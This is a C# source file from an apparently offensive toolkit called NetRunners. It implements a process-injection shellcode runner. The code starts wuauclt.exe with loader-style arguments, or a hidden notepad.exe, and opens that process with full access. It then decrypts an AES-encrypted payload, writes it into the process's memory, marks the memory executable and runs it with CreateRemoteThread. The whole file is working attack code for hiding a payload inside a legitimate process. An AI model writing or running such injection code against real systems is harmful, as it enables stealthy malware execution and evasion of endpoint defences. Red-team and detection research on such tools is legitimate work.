using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

using NetRunners.Interfaces;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Helpers.Helper;
using static NetRunners.Data.WinConstants;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    // credits: https://github.com/tasox/CSharp_Process_Injection/tree/main/02.%20Process_Injection_template_(High%20Level%20Windows%20API)%20-%20Suspend
    public class NewProcessInjectionRunner : IRunner
    {
        public void Run(string[] args = null)
        {
            IntPtr hProcess = default;
            string techniqueName = "New Process Injection";
            string targetProcess;

            // no process name supplied
            if (args.Length <= 1)
            {
                // create process depending on this program's architecture
                if (IntPtr.Size == 8)
                {
                    targetProcess = "wuauclt.exe";   
                    PrintTechniqueInfo(techniqueName, targetProcess);
                    // start process
                    ProcessStartInfo startInfo = new ProcessStartInfo(targetProcess);
                    startInfo.Arguments = "/UpdateDeploymentProvider aadauthhelper.dll /RunHandlerComServer";
                    Process.Start(startInfo);
                }
                else
                {
                    targetProcess = "notepad.exe";
                    PrintTechniqueInfo(techniqueName, targetProcess);
                    // start process
                    ProcessStartInfo startInfo = new ProcessStartInfo($"C:\\Windows\\SysWow64\\{targetProcess}");
                    startInfo.CreateNoWindow = true;
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                    Process.Start(startInfo);
                }
            }
            else
            {
                targetProcess = args[1];
                PrintTechniqueInfo(techniqueName, targetProcess);
                // start process
                ProcessStartInfo startInfo = new ProcessStartInfo(targetProcess);
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                Process.Start(startInfo);
            }

            // get process handle, determine process architecture
            Process[] procName = Process.GetProcessesByName(targetProcess.Split('.')[0]);         // name without extension
            int processID = 0;
            bool Is32BitProcess = false;
            foreach (Process process in procName)
            {
                processID = process.Id;
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (uint)process.Id);

                IsWow64Process(hProcess, out Is32BitProcess);
            }

            // retrieve unencrypted payload size
            int sBuf = SelectPayloadSize(Is32BitProcess);

            // perform memory allocation, print pid + allocated address info
            IntPtr pMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_READWRITE);
            if (pMemory == IntPtr.Zero)
                throw new InvalidOperationException($"[-] VirtualAllocEx failed with error code: {Marshal.GetLastWin32Error()}");

            var allocAddress = string.Format("{0:X}", pMemory);         // Pointer -> String
            UInt64 number = UInt64.Parse(allocAddress);                 // String -> Int
            string allocAddressHex = number.ToString("x");              // Int -> Hex
            Console.WriteLine("[+] RW Memory Address (VirtualAllocEx) to remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);

            // select and decrypt payload
            byte[] buf = SelectPayloadArchitecture(Is32BitProcess);
            buf = DecryptBytesToBytesAes(buf, AesKey);

            // copy payload to allocated memory
            IntPtr outSize = IntPtr.Zero;
            WriteProcessMemory(hProcess, pMemory, buf, buf.Length, out outSize);
            if (outSize == IntPtr.Zero)
                throw new InvalidOperationException($"[-] WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
            Console.WriteLine("[+] Payload has been written to the buffer!");

            // change memory protection to exec read
            uint oldProtect;
            int bVP = VirtualProtectEx(hProcess, pMemory, (UIntPtr)sBuf, PAGE_EXECUTE_READ, out oldProtect);
            if (bVP != 1) // not true
                throw new InvalidOperationException($"VirtualProtect failed with error code: {Marshal.GetLastWin32Error()}");
            Console.WriteLine("[+] Memory Address protections changed to EXECUTE_READ");

            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            // Create a thread and execute it
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pMemory, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
                throw new InvalidOperationException($"[-] CreateRemoteThread failed with error code: {Marshal.GetLastWin32Error()}");

            uint res = ResumeThread(hThread);

            //Enumerate threads from the given process.
            ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                }
            }
        }
    }
}
